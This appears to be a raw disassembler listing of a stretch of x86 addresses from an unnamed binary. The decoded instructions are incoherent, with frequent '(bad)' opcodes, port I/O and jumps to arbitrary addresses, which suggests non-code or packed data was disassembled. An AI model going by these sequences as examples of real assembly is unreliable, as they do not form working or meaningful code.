  41a657:	pop    ecx
  41a658:	xor    ch,BYTE PTR [esp+edx*1-0x2e]
  41a65c:	dec    edi
  41a65d:	arpl   WORD PTR [eax],bp
  41a65f:	aaa    
  41a660:	add    al,0x4f
  41a662:	and    ebp,ebx
  41a664:	je     0x41a642
  41a666:	add    DWORD PTR [edi+0x51],edi
  41a669:	in     eax,dx
  41a66a:	in     eax,dx
  41a66b:	jae    0x41a6a9
  41a66d:	test   DWORD PTR [edi+eiz*8+0x679fb5ab],eax
  41a674:	dec    eax
  41a675:	je     0x41a637
  41a677:	loop   0x41a6e4
  41a679:	imul   edx,DWORD PTR [edx+0x556ef456],0xae40460b
  41a683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a684:	pop    DWORD PTR [ebp+0x6ce7610b]
  41a68a:	call   0x4c6b6eac
  41a68f:	jecxz  0x41a6bb
  41a691:	push   ebp
  41a692:	ret    0x7faa
  41a695:	mov    ebx,0xd176737a
  41a69a:	int3   
  41a69b:	les    ebx,FWORD PTR [esi-0x4f4dfe9f]
  41a6a1:	add    al,0xf
  41a6a3:	es xchg esi,eax
  41a6a5:	jno    0x41a691
  41a6a7:	cmp    BYTE PTR ds:0xb781b531,bh
  41a6ad:	jg     0x41a6ac
  41a6af:	pop    ebx
  41a6b0:	adc    BYTE PTR [ebx+0x24],0x1a
  41a6b4:	and    al,0x81
  41a6b6:	aad    0x2a
  41a6b8:	leave  
  41a6b9:	aas    
  41a6ba:	xchg   ebx,eax
  41a6bb:	test   DWORD PTR [ecx+ecx*4],ecx
  41a6be:	pop    ss
  41a6bf:	xor    eax,0x7d141e91
  41a6c4:	cmp    WORD PTR [edi+0x7f5795ea],bx
  41a6cb:	int3   
  41a6cc:	inc    eax
  41a6cd:	out    dx,eax
  41a6ce:	das    
  41a6cf:	jb     0x41a680
  41a6d1:	add    dl,dh
  41a6d3:	mov    cl,0xd0
  41a6d5:	repz mov ch,0xd0
  41a6d8:	inc    edi
  41a6d9:	unpcklps xmm1,XMMWORD PTR [eax]
  41a6dc:	mov    BYTE PTR [edx-0x18],ah
  41a6df:	loop   0x41a691
  41a6e1:	fucomp st(1)
  41a6e3:	push   edi
  41a6e4:	or     BYTE PTR [esi-0x32],0xe2
  41a6e8:	or     DWORD PTR [edx],0xf8d82ae6
  41a6ee:	test   BYTE PTR [edi+0x122d1580],0xaa
  41a6f5:	imul   edx,DWORD PTR [esi+0x62],0xffffffca
  41a6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6fa:	jno    0x41a6ab
  41a6fc:	mov    esp,0x2b21ce03
  41a701:	iret   
  41a702:	and    al,0x44
  41a704:	ja     0x41a731
  41a706:	jo     0x41a6a6
  41a708:	pop    ebp
  41a709:	sbb    eax,0xe2a6716d
  41a70e:	adc    DWORD PTR [edx+ebx*2+0x28],ecx
  41a712:	fnstcw WORD PTR [eax-0x2a]
  41a715:	mov    edx,DWORD PTR [eax-0x38fa095b]
  41a71b:	iret   
  41a71c:	cmp    dh,BYTE PTR [ebx+0x2e966b72]
  41a722:	jecxz  0x41a6e2
  41a724:	pop    ss
  41a725:	mov    bl,0x94
  41a727:	fcom   QWORD PTR [eax+eiz*2]
  41a72a:	mov    cl,0xd3
  41a72c:	daa    
  41a72d:	and    DWORD PTR fs:[ecx],ecx
  41a730:	mov    cl,0x9
  41a732:	push   ebp
  41a733:	cwde   
  41a734:	out    0xbf,al
  41a736:	out    0x34,al
  41a738:	lods   al,BYTE PTR ds:[esi]
  41a739:	push   edx
  41a73a:	loope  0x41a6c8
  41a73c:	stos   DWORD PTR es:[edi],eax
  41a73d:	ficom  DWORD PTR [edi-0x1a]
  41a740:	inc    esi
  41a741:	or     eax,0x93aaa5f0
  41a746:	(bad)  
  41a747:	loope  0x41a76b
  41a749:	pop    esi
  41a74a:	enter  0x5d15,0x66
  41a74e:	cmp    al,0x81
  41a750:	jb     0x41a782
  41a752:	adc    DWORD PTR [eax+0x4e],eax
  41a755:	fwait
  41a756:	call   0x1a9503b7
  41a75b:	(bad)  
  41a75d:	std    
  41a75e:	daa    
  41a75f:	out    0x68,eax
  41a761:	jbe    0x41a7c2
  41a763:	in     al,0xc8
  41a765:	icebp  
  41a766:	jmp    0x41a6f3
  41a768:	and    esi,DWORD PTR [edx]
  41a76a:	les    ebp,FWORD PTR [ebx-0x76]
  41a76d:	retf   0xcad
  41a770:	in     al,0x98
  41a772:	shl    DWORD PTR [ebx+0x71c01764],cl
  41a778:	outs   dx,DWORD PTR ds:[esi]
  41a779:	inc    ebx
  41a77a:	inc    edx
  41a77b:	sub    eax,0xff3cf65a
  41a780:	sbb    al,0x30
  41a782:	add    edi,DWORD PTR [edi+0x177c03eb]
  41a788:	inc    edx
  41a789:	mov    eax,0xf7fd54dc
  41a78e:	iret   
  41a78f:	(bad)  
  41a791:	aad    0xb3
  41a793:	test   dl,cl
  41a795:	adc    eax,0x10a21d0c
  41a79a:	stc    
  41a79b:	out    0x7e,al
  41a79d:	push   0xbb1fcda1
  41a7a2:	xlat   BYTE PTR ss:[ebx]
  41a7a4:	inc    ebx
  41a7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7a6:	call   0xb20d0239
  41a7ab:	pop    esp
  41a7ac:	cmc    
  41a7ad:	fmul   st,st(7)
  41a7af:	jb     0x41a7d2
  41a7b1:	scas   eax,DWORD PTR es:[edi]
  41a7b2:	mov    DWORD PTR ss:[ecx-0x1bbd054f],ebx
  41a7b9:	push   eax
  41a7ba:	pop    edi
  41a7bb:	push   esi
  41a7bc:	cmp    eax,0x209dc73a
  41a7c1:	add    eax,0xe7c7fb73
  41a7c6:	xchg   ebp,eax
  41a7c7:	pop    ss
  41a7c8:	lods   eax,DWORD PTR ds:[esi]
  41a7c9:	(bad)  
  41a7ca:	and    eax,DWORD PTR [eax+0x2c]
  41a7cd:	dec    edx
  41a7ce:	xchg   esp,eax
  41a7cf:	adc    al,0x82
  41a7d1:	(bad)  
  41a7d2:	imul   ebp,DWORD PTR [ebp+0x1],0xfffffff0
  41a7d6:	sub    ebx,esp
  41a7d8:	ins    BYTE PTR es:[edi],dx
  41a7d9:	imul   edi,ecx,0x35ff4cf1
  41a7df:	enter  0x78ea,0x43
  41a7e3:	dec    edx
  41a7e4:	fisub  DWORD PTR [ecx]
  41a7e6:	mov    BYTE PTR [eax],ch
  41a7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7e9:	push   ecx
  41a7ea:	jne    0x41a837
  41a7ec:	inc    edi
  41a7ed:	iret   
  41a7ee:	das    
  41a7ef:	mov    ds:0x3d8b97eb,al
  41a7f4:	cmp    edx,eax
  41a7f6:	loop   0x41a7c1
  41a7f8:	ret    0xe59b
  41a7fb:	scas   eax,DWORD PTR es:[edi]
  41a7fc:	lahf   
  41a7fd:	sbb    al,0xb4
  41a7ff:	cs xchg edx,eax
  41a801:	push   0x35
  41a803:	add    dh,BYTE PTR [ecx+0xe]
  41a806:	inc    ecx
  41a807:	mov    WORD PTR [ecx],gs
  41a809:	pusha  
  41a80a:	iret   
  41a80b:	jmp    0x41a7bd
  41a80d:	leave  
  41a80e:	add    al,0x7
  41a810:	jbe    0x41a85a
  41a812:	mov    edi,0xda8ceaa2
  41a817:	out    0xb,eax
  41a819:	stos   BYTE PTR es:[edi],al
  41a81a:	mov    dh,0xf9
  41a81c:	iret   
  41a81d:	loop   0x41a817
  41a81f:	or     DWORD PTR [eax+eax*1+0x3ae3b4f1],0xffffffcf
  41a827:	adc    bl,al
  41a829:	int    0xa8
  41a82b:	cmp    BYTE PTR ds:0xaa219c17,ah
  41a832:	scas   eax,DWORD PTR es:[edi]
  41a833:	retf   0x8e64
  41a836:	shr    BYTE PTR [esp+ecx*4-0x7e3c150e],cl
  41a83d:	ins    BYTE PTR es:[edi],dx
  41a83e:	or     ebx,eax
  41a840:	mov    bl,0x69
  41a842:	mov    WORD PTR [ecx+0x4f6070b3],ds
  41a848:	repnz (bad) 
  41a84a:	jmp    0x41a846
  41a84c:	or     dl,BYTE PTR [ebx]
  41a84e:	inc    esi
  41a84f:	repnz gs std 
  41a852:	(bad)  
  41a853:	jne    0x41a868
  41a855:	test   al,0x65
  41a857:	adc    DWORD PTR [ebx],ecx
  41a859:	push   eax
  41a85a:	fcom   DWORD PTR [ebp-0x63]
  41a85d:	adc    al,0xda
  41a85f:	pop    esp
  41a860:	nop
  41a861:	call   0xb779d0e
  41a866:	or     edi,esp
  41a868:	xchg   esi,eax
  41a869:	mov    ebp,DWORD PTR [esi-0x1f]
  41a86c:	xchg   ebx,eax
  41a86d:	pop    ebp
  41a86e:	(bad)  
  41a86f:	push   ecx
  41a870:	out    0x6,al
  41a872:	adc    eax,0xc4079c1a
  41a877:	inc    ecx
  41a878:	(bad)  
  41a879:	dec    ebx
  41a87a:	push   es
  41a87b:	push   edi
  41a87c:	or     eax,0xb6e7f302
  41a881:	jns    0x41a8c9
  41a883:	ror    ecx,cl
  41a885:	outs   dx,DWORD PTR ds:[esi]
  41a886:	mov    ebp,DWORD PTR [edi-0x7f]
  41a889:	add    BYTE PTR [ecx],bh
  41a88b:	add    eax,0xd522e0bc
  41a890:	bound  esp,QWORD PTR [ecx+ecx*8+0x61]
  41a894:	retf   0x1a77
  41a897:	cwde   
  41a898:	dec    ecx
  41a899:	push   0x535fa0c4
  41a89e:	mov    ebp,0xb192e0e9
  41a8a3:	rol    BYTE PTR [ebx+esi*4-0x7f6e0e53],cl
  41a8aa:	ins    DWORD PTR es:[edi],dx
  41a8ab:	and    DWORD PTR [edi+0x21a161bd],0x37f283ee
  41a8b5:	mov    eax,0x395b4bbe
  41a8ba:	mov    edx,0x59e0e496
  41a8bf:	push   es
  41a8c0:	pop    esi
  41a8c1:	jae    0x41a881
  41a8c3:	(bad)  
  41a8c4:	push   ecx
  41a8c5:	std    
  41a8c6:	lods   eax,DWORD PTR ds:[esi]
  41a8c7:	add    bl,BYTE PTR [ebx+0x6cececda]
  41a8cd:	pop    edi
  41a8ce:	push   edx
  41a8cf:	jp     0x41a88e
  41a8d1:	loop   0x41a951
  41a8d3:	loopne 0x41a8ca
  41a8d5:	dec    ebx
  41a8d6:	sub    eax,0xefc150ab
  41a8db:	jb     0x41a877
  41a8dd:	xchg   BYTE PTR [ecx+0x21],bh
  41a8e0:	int    0x32
  41a8e2:	dec    edx
  41a8e3:	fldenv [eax+0x23]
  41a8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8e7:	and    dh,BYTE PTR [edx+0x1f30108a]
  41a8ed:	and    eax,0xdf8d48b8
  41a8f2:	jnp    0x41a88b
  41a8f4:	push   edx
  41a8f5:	jp     0x41a891
  41a8f7:	popf   
  41a8f8:	xchg   ebp,eax
  41a8f9:	dec    ecx
  41a8fa:	fs or  ch,0x4e
  41a8fe:	aas    
  41a8ff:	stos   DWORD PTR es:[edi],eax
  41a900:	xor    ecx,DWORD PTR [ebp-0x4b10ab20]
  41a906:	dec    esp
  41a907:	ins    DWORD PTR es:[edi],dx
  41a908:	mov    bl,0xc4
  41a90a:	aaa    
  41a90b:	xchg   ebx,eax
  41a90c:	mov    ds:0xafc6c673,eax
  41a911:	rcl    esp,0xd3
  41a914:	fs shl bl,cl
  41a917:	or     ebp,DWORD PTR [ebp-0x709e6113]
  41a91d:	mov    bl,BYTE PTR [esi]
  41a91f:	imul   edi,DWORD PTR [esi],0x7c
  41a922:	in     eax,0x70
  41a924:	and    DWORD PTR [ebx+ecx*4],ebx
  41a927:	jl     0x41a93f
  41a929:	fisttp QWORD PTR [ecx+0x53]
  41a92c:	sbb    esp,ebp
  41a92e:	fisubr WORD PTR [edx]
  41a931:	fwait
  41a932:	mov    al,ds:0xe0d06c57
  41a937:	and    dl,BYTE PTR [edi-0x36568794]
  41a93d:	dec    eax
  41a93e:	outs   dx,BYTE PTR ds:[esi]
  41a93f:	jmp    0x25c18ec9
  41a944:	push   esi
  41a945:	adc    BYTE PTR [edi],bl
  41a947:	ror    BYTE PTR [edi+0x4],1
  41a94a:	push   cs
  41a94b:	fs cmp dh,dl
  41a94e:	aam    0xd0
  41a950:	cmp    cl,BYTE PTR ds:[edi-0x2f]
  41a954:	inc    ecx
  41a955:	addr16 jp 0x41a968
  41a958:	lods   al,BYTE PTR ds:[esi]
  41a959:	xor    edi,0xb3a91184
  41a95f:	rcr    BYTE PTR [esi],cl
  41a961:	rdpmc  
  41a963:	pop    ebp
  41a964:	je     0x41a934
  41a966:	and    cl,al
  41a968:	jns    0x41a9e3
  41a96a:	xchg   edi,eax
  41a96b:	lods   eax,DWORD PTR ds:[esi]
  41a96c:	hlt    
  41a96d:	in     al,dx
  41a96e:	(bad)  
  41a96f:	sbb    eax,0x2750ffc3
  41a974:	adc    eax,0x7612cbdf
  41a979:	mov    ah,BYTE PTR [ecx]
  41a97b:	fadd   QWORD PTR [edi]
  41a97d:	push   edi
  41a97e:	sbb    dl,BYTE PTR [edx+0x32]
  41a981:	and    al,0xee
  41a983:	push   ebx
  41a984:	rcr    DWORD PTR [eax],1
  41a986:	js     0x41a9a9
  41a988:	jp     0x41a973
  41a98a:	rcr    BYTE PTR [ecx-0x692774b0],1
  41a990:	shl    BYTE PTR [ecx+0x1997cca3],1
  41a996:	sub    DWORD PTR [eax+0x2],ecx
  41a999:	in     eax,dx
  41a99a:	add    eax,DWORD PTR [eax-0x3]
  41a99d:	xchg   edx,eax
  41a99e:	jnp    0x41a9ec
  41a9a0:	and    al,0x32
  41a9a2:	mov    dh,0xdd
  41a9a4:	fisubr WORD PTR [ebp+0xdbfceb9]
  41a9aa:	cld    
  41a9ab:	dec    eax
  41a9ac:	test   DWORD PTR [ebx+0x57ad5927],edi
  41a9b2:	jbe    0x41a9bc
  41a9b4:	pop    edi
  41a9b5:	mov    ss,eax
  41a9b7:	daa    
  41a9b8:	call   0x5b12bc9b
  41a9bd:	xor    eax,0xe368a6db
  41a9c2:	mov    esi,0x2b829e60
  41a9c7:	fistp  DWORD PTR [esi]
  41a9c9:	retf   
  41a9ca:	shr    bh,1
  41a9cc:	and    DWORD PTR ds:0xec0cc0d1,edx
  41a9d2:	lods   eax,DWORD PTR ds:[esi]
  41a9d3:	out    dx,eax
  41a9d4:	adc    ah,BYTE PTR [edi-0x2f]
  41a9d7:	int    0x27
  41a9d9:	pop    ecx
  41a9da:	add    DWORD PTR [ecx-0x52289c07],edi
  41a9e0:	inc    ecx
  41a9e1:	mov    ah,ah
  41a9e3:	fsubr  st,st(2)
  41a9e5:	ror    DWORD PTR [eax],1
  41a9e7:	(bad)  
  41a9e8:	xor    edx,DWORD PTR [eax]
  41a9ea:	test   DWORD PTR [edi-0x4d192fca],0x34196832
  41a9f4:	cmp    DWORD PTR [eax],esi
  41a9f6:	aad    0x13
  41a9f8:	pop    ss
  41a9f9:	push   eax
  41a9fa:	cmp    BYTE PTR [ebx-0x51],cl
  41a9fd:	jge    0x41aa6e
  41a9ff:	xor    dh,bh
  41aa01:	mov    al,ds:0x96db0b23
  41aa06:	retf   
  41aa07:	lods   eax,DWORD PTR ds:[esi]
  41aa08:	jno    0x41a9ce
  41aa0a:	mov    ah,cl
  41aa0c:	call   0x776f98da
  41aa11:	daa    
  41aa12:	mov    ch,0xef
  41aa14:	enter  0x84b9,0x7c
  41aa18:	inc    edi
  41aa19:	pop    esp
  41aa1a:	xor    al,0xf1
  41aa1c:	dec    ebp
  41aa1d:	outs   dx,DWORD PTR ds:[esi]
  41aa1e:	jge    0x41a9e8
  41aa20:	ds xchg ecx,eax
  41aa22:	sbb    ecx,DWORD PTR [ebx]
  41aa24:	sub    BYTE PTR [eax],dh
  41aa26:	or     BYTE PTR [esi+0x660ca283],bh
  41aa2c:	test   BYTE PTR [edx-0x5c],bl
  41aa2f:	loop   0x41aa33
  41aa31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa32:	pop    eax
  41aa33:	sti    
  41aa34:	jmp    0x24855b15
  41aa39:	jmp    0x1ead:0x58e724dc
  41aa40:	sbb    DWORD PTR [esi+edi*2-0x6b],esp
  41aa44:	inc    ebp
  41aa45:	shr    DWORD PTR [eax+0x7bdce8c7],0x48
  41aa4c:	jp     0x41aa65
  41aa4e:	das    
  41aa4f:	imul   edi,DWORD PTR [edi],0xa585ba46
  41aa55:	gs sub eax,0x1f178f3d
  41aa5b:	daa    
  41aa5c:	dec    ecx
  41aa5d:	xchg   esp,eax
  41aa5e:	int3   
  41aa5f:	pop    ebx
  41aa60:	push   ebp
  41aa61:	in     eax,dx
  41aa62:	test   eax,0x6aa48607
  41aa67:	inc    ecx
  41aa68:	ds add al,0xfa
  41aa6b:	sbb    DWORD PTR [edx+0x4102119],ebp
  41aa71:	add    eax,0x13787f1b
  41aa76:	jmpw   0xbf9
  41aa7a:	sub    edx,DWORD PTR [ebx]
  41aa7c:	int    0xcd
  41aa7e:	mov    ebx,0x405e69d2
  41aa83:	add    al,0xf9
  41aa85:	sub    bl,BYTE PTR [ebp-0x23]
  41aa88:	mov    al,0x10
  41aa8a:	jb     0x41aaf0
  41aa8c:	loope  0x41aa2a
  41aa8e:	xor    eax,0x930f2115
  41aa93:	cs pop edi
  41aa95:	and    eax,0xf5ceade2
  41aa9a:	pop    edi
  41aa9b:	cmp    BYTE PTR [esp+eax*1+0x2d780013],ah
  41aaa2:	xor    ah,BYTE PTR [eax-0x19]
  41aaa5:	inc    ebx
  41aaa6:	(bad)  
  41aaa7:	mov    bh,0x65
  41aaa9:	push   esi
  41aaaa:	scas   eax,DWORD PTR es:[edi]
  41aaab:	in     al,0x3b
  41aaad:	xor    eax,0xc6fd8a49
  41aab2:	(bad)
  41aab5:	jp     0x41aacc
  41aab7:	cmp    al,0xaf
  41aab9:	cwde   
  41aaba:	pop    ds
  41aabb:	inc    edi
  41aabc:	in     eax,dx
  41aabd:	arpl   WORD PTR [ebx+0x31a1851e],sp
  41aac3:	jge    0x41aa4e
  41aac5:	(bad)  
  41aac6:	adc    DWORD PTR [ebx-0x14],ebp
  41aac9:	pop    ebp
  41aaca:	add    eax,0x431b6f6a
  41aacf:	mov    ch,0xe3
  41aad1:	jns    0x41aadf
  41aad3:	cs sbb al,0xa9
  41aad6:	ss mov ah,0x68
  41aad9:	aad    0xe7
  41aadb:	cmp    edi,DWORD PTR [esi+0x20]
  41aade:	jne    0x41aad1
  41aae0:	jg     0x41ab5f
  41aae2:	aaa    
  41aae3:	adc    al,0x1c
  41aae5:	jp     0x41ab0b
  41aae7:	ds aad 0xe2
  41aaea:	xchg   DWORD PTR [esi],ecx
  41aaec:	ret    0xde0e
  41aaef:	adc    DWORD PTR [ecx],ecx
  41aaf1:	mov    esi,DWORD PTR [ebx]
  41aaf3:	pop    edi
  41aaf4:	jl     0x41aaa2
  41aaf6:	mov    ds:0x261dca09,al
  41aafb:	aaa    
  41aafc:	hlt    
  41aafd:	(bad)  
  41aafe:	mov    ch,0x9e
  41ab00:	push   es
  41ab01:	retf   0xffa4
  41ab04:	hlt    
  41ab05:	or     al,0xff
  41ab07:	ret    
  41ab08:	in     eax,0xdf
  41ab0a:	dec    ebp
  41ab0b:	mov    edx,0x50ac6a4e
  41ab10:	pop    ebx
  41ab11:	std    
  41ab12:	xlat   BYTE PTR ds:[ebx]
  41ab13:	mov    BYTE PTR [eax+0x61c97353],dh
  41ab19:	pop    edi
  41ab1a:	inc    cl
  41ab1c:	dec    ebp
  41ab1d:	out    0xfb,eax
  41ab1f:	clc    
  41ab20:	sub    DWORD PTR [edx+0x18],ebx
  41ab23:	in     al,0xc
  41ab25:	jmp    0x41ab53
  41ab27:	outs   dx,BYTE PTR ds:[esi]
  41ab28:	pop    ebp
  41ab29:	imul   eax,DWORD PTR [eax],0x27f22f58
  41ab2f:	or     bh,BYTE PTR [esi+0x7d75ba28]
  41ab35:	and    DWORD PTR [edx+ebp*1+0xf],esp
  41ab39:	call   0x2ae3f51b
  41ab3e:	mov    ebp,0x96a31fdd
  41ab43:	clc    
  41ab44:	mov    al,0x4
  41ab46:	jecxz  0x41ab34
  41ab48:	pop    ebx
  41ab49:	jge    0x41ab3f
  41ab4b:	lods   al,BYTE PTR ds:[esi]
  41ab4c:	mov    eax,ds:0xba9b1604
  41ab51:	dec    eax
  41ab52:	test   al,0x2
  41ab54:	cmp    eax,0xa1f90b35
  41ab59:	mov    WORD PTR [eax+0x5ed9024e],fs
  41ab5f:	call   0x5948:0xfa81ab17
  41ab66:	sti    
  41ab67:	pusha  
  41ab68:	mov    edx,0x23c28832
  41ab6d:	scas   al,BYTE PTR es:[edi]
  41ab6e:	ins    BYTE PTR es:[edi],dx
  41ab6f:	xchg   ebx,eax
  41ab70:	aad    0x7a
  41ab72:	loope  0x41ab47
  41ab74:	stos   DWORD PTR es:[edi],eax
  41ab75:	xor    DWORD PTR [ebx],edi
  41ab77:	xchg   ecx,eax
  41ab78:	inc    esi
  41ab79:	mov    esi,0xc25164d4
  41ab7e:	outs   dx,BYTE PTR ds:[esi]
  41ab7f:	add    ch,BYTE PTR [bx+si-0x20b2]
  41ab84:	fisubr WORD PTR [eax]
  41ab86:	bound  ebx,QWORD PTR [edx+0xd]
  41ab89:	repz call 0x8771c660
  41ab8f:	repnz dec esp
  41ab91:	sub    eax,DWORD PTR [edi-0x78]
  41ab94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab95:	adc    dl,cl
  41ab97:	adc    al,0xfc
  41ab9a:	retf   0x2bf2
  41ab9d:	xchg   DWORD PTR [ebx],esp
  41ab9f:	rcl    BYTE PTR [esi+eax*8],1
  41aba2:	lea    eax,ds:0x67c80273
  41aba8:	cli    
  41aba9:	outs   dx,BYTE PTR ds:[esi]
  41abaa:	adc    BYTE PTR [eax],dh
  41abac:	sub    dl,ch
  41abae:	jns    0x41abd6
  41abb0:	push   eax
  41abb1:	xchg   ch,bl
  41abb3:	dec    esi
  41abb4:	leave  
  41abb5:	adc    BYTE PTR [edi+0x29],dh
  41abb8:	popa   
  41abb9:	(bad)  [ebx]
  41abbb:	in     al,dx
  41abbc:	in     eax,0x89
  41abbe:	ffree  st(7)
  41abc0:	push   ds
  41abc1:	sar    dh,1
  41abc3:	xor    al,0x15
  41abc5:	inc    ebp
  41abc6:	dec    ebx
  41abc7:	xchg   ebp,eax
  41abc8:	mov    BYTE PTR ds:0x747907a1,ch
  41abce:	mov    ?,WORD PTR [eax]
  41abd0:	iret   
  41abd1:	jg     0x41ac50
  41abd3:	pop    ecx
  41abd4:	pop    ecx
  41abd5:	pop    ds
  41abd6:	repnz and eax,0x94903d43
  41abdc:	in     eax,dx
  41abdd:	pop    edi
  41abde:	adc    eax,0xd9bb7896
  41abe3:	in     al,dx
  41abe4:	pop    ebx
  41abe5:	imul   edx,DWORD PTR [eax-0x175919bc],0xfbb21404
  41abef:	sub    al,0x9d
  41abf1:	ror    dl,1
  41abf3:	push   cs
  41abf4:	es mov ebx,0x6662df7f
  41abfa:	repz sbb eax,0x122c54e0
  41ac00:	fiadd  WORD PTR [edx]
  41ac02:	ja     0x41ac26
  41ac04:	sti    
  41ac05:	pusha  
  41ac06:	pop    edi
  41ac07:	ins    BYTE PTR es:[edi],dx
  41ac08:	mov    bl,0x93
  41ac0a:	pop    ebp
  41ac0b:	dec    bl
  41ac0d:	ret    
  41ac0e:	idiv   BYTE PTR [edx]
  41ac10:	jb     0x41abab
  41ac12:	out    0x5,al
  41ac14:	adc    ecx,DWORD PTR [esp+esi*8-0x350a55c4]
  41ac1b:	stos   DWORD PTR es:[edi],eax
  41ac1c:	pop    ss
  41ac1d:	aad    0x5e
  41ac1f:	push   esp
  41ac20:	ficom  DWORD PTR [edi-0x22]
  41ac23:	std    
  41ac24:	scas   al,BYTE PTR es:[edi]
  41ac25:	jns    0x41ac0b
  41ac27:	mov    DWORD PTR [esp+edi*1],eax
  41ac2a:	mov    esp,0xb48d2146
  41ac2f:	adc    DWORD PTR [ebx-0x31],0x63
  41ac33:	pop    es
  41ac34:	mov    ebp,DWORD PTR [ecx-0x15c5e9c1]
  41ac3a:	add    ebx,DWORD PTR [esi+edi*1-0x2640fe0e]
  41ac41:	mov    edi,0xd8d32627
  41ac46:	and    al,bl
  41ac48:	aad    0xaa
  41ac4a:	mov    bh,0xb4
  41ac4c:	sub    esi,DWORD PTR [esi+0x5b6209e6]
  41ac52:	fsub   QWORD PTR [ecx-0x6803e1b5]
  41ac58:	pop    edi
  41ac59:	jl     0x41ac10
  41ac5b:	push   ecx
  41ac5c:	mov    ds:0xcb5631f6,eax
  41ac61:	add    BYTE PTR [ebp-0x51],bh
  41ac64:	fldpi  
  41ac66:	aas    
  41ac67:	xchg   ebp,eax
  41ac68:	jmp    0xe2e67ce3
  41ac6d:	jnp    0x41ac14
  41ac6f:	adc    al,0x9d
  41ac71:	fldcw  WORD PTR [edi]
  41ac73:	dec    esi
  41ac74:	call   0xb9fc:0x240fc5fa
  41ac7b:	pop    ds
  41ac7c:	add    eax,DWORD PTR [ebp-0x5a418be4]
  41ac82:	cmc    
  41ac83:	adc    BYTE PTR [esi-0x22],cl
  41ac86:	test   DWORD PTR [esi+0x3f],esi
  41ac89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac8a:	aas    
  41ac8b:	rcl    eax,1
  41ac8d:	les    ecx,FWORD PTR [ebp+0x230e7bb3]
  41ac93:	mov    edx,0x9f546b3e
  41ac98:	pop    esi
  41ac99:	fwait
  41ac9a:	(bad)  
  41ac9b:	nop
  41ac9c:	adc    DWORD PTR [edi-0x48],0x13eea798
  41aca3:	das    
  41aca4:	add    eax,0xdca755f5
  41aca9:	xor    BYTE PTR [esi+ebx*2+0x4],dl
  41acad:	cmp    eax,0xa72de6e3
  41acb2:	mov    ecx,0x4e88dbee
  41acb7:	stc    
  41acb8:	mov    eax,0xab56cab2
  41acbd:	xchg   al,al
  41acbf:	dec    esp
  41acc0:	mov    cl,0xdf
  41acc2:	xor    al,0x1f
  41acc4:	jecxz  0x41ac54
  41acc6:	pop    esi
  41acc7:	cmc    
  41acc8:	nop
  41acc9:	and    BYTE PTR [edi-0x40],al
  41accc:	bound  esi,QWORD PTR [ecx+0x5bc2a42e]
  41acd2:	pop    esp
  41acd3:	idiv   BYTE PTR [ebx+eiz*2+0x1cf740fa]
  41acda:	imul   ecx,edx,0x33
  41acdd:	pop    eax
  41acde:	leave  
  41acdf:	mov    dl,0x11
  41ace1:	mov    edx,edx
  41ace3:	lea    ebp,[edx-0x54af37]
  41ace9:	mov    ds:0xf4dbc204,eax
  41acee:	ins    DWORD PTR es:[edi],dx
  41acef:	push   edi
  41acf0:	pop    esp
  41acf1:	sbb    BYTE PTR [eax+0xd83bb46],bh
  41acf7:	vhaddps xmm2,xmm4,xmm5
  41acfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acfc:	xchg   edi,eax
  41acfd:	cmp    ebx,esi
  41acff:	jmp    0xc7a0eac1
  41ad04:	retf   0x36bd
  41ad07:	mov    edi,db2
  41ad0a:	push   esp
  41ad0b:	mov    ah,0xf4
  41ad0d:	mov    al,ds:0xf8ef4691
  41ad12:	mov    bl,0x27
  41ad14:	ds fscale 
  41ad17:	and    al,0x24
  41ad19:	test   al,0xfa
  41ad1b:	std    
  41ad1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad1d:	test   al,0x43
  41ad1f:	mov    ds,WORD PTR [ebp+0x40]
  41ad22:	and    BYTE PTR [edi+0x20751952],dl
  41ad28:	or     eax,0x33dfe810
  41ad2d:	adc    cl,0xc6
  41ad30:	pop    ebx
  41ad31:	adc    al,0x44
  41ad33:	pop    ebx
  41ad34:	retf   
  41ad35:	or     DWORD PTR [esi],ebx
  41ad37:	int    0x4f
  41ad39:	bound  edi,QWORD PTR [ecx]
  41ad3b:	adc    eax,0xb95c5899
  41ad40:	xchg   DWORD PTR [eax-0x7e],edi
  41ad43:	jle    0x41ad4f
  41ad45:	and    BYTE PTR [esi-0x368b5527],al
  41ad4b:	xor    dl,dl
  41ad4d:	mov    ch,0xaa
  41ad4f:	sub    BYTE PTR ds:0x8a346266,dh
  41ad55:	fwait
  41ad56:	aas    
  41ad57:	xlat   BYTE PTR ds:[ebx]
  41ad58:	std    
  41ad59:	xchg   BYTE PTR [eax+ebx*4+0x274bca91],al
  41ad60:	ja     0x41ad93
  41ad62:	cs movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ad65:	mov    BYTE PTR [edx+edx*2],dh
  41ad68:	test   BYTE PTR [eax],al
  41ad6a:	(bad)  
  41ad6b:	stc    
  41ad6c:	jno    0x41acf6
  41ad6e:	push   cs
  41ad6f:	sbb    DWORD PTR [edi-0x51],0xee887df1
  41ad76:	cmp    al,0xbe
  41ad78:	imul   ebp,ebp,0x7c8f43ad
  41ad7e:	lods   al,BYTE PTR ds:[esi]
  41ad7f:	cmp    DWORD PTR [ecx],0x7224e065
  41ad85:	mov    edx,ebp
  41ad87:	std    
  41ad88:	shl    ch,cl
  41ad8a:	mov    DWORD PTR [ebp+0x13],0xffdc5ffb
  41ad91:	and    dl,BYTE PTR [edi-0x7ef4d8b9]
  41ad97:	push   ebx
  41ad98:	xchg   DWORD PTR [eax+0x5f],edx
  41ad9b:	and    al,0x54
  41ad9d:	stos   DWORD PTR es:[edi],eax
  41ad9e:	jne    0x41adf0
  41ada0:	das    
  41ada1:	mov    BYTE PTR [edi],al
  41ada3:	sbb    DWORD PTR [edi+0x7148f61c],esi
  41ada9:	stos   DWORD PTR es:[edi],eax
  41adaa:	jb     0x41ad8d
  41adac:	push   0xffffff9f
  41adae:	sbb    esi,0x120c2b72
  41adb4:	test   DWORD PTR [eax],0x249f925a
  41adba:	ret    0x8e51
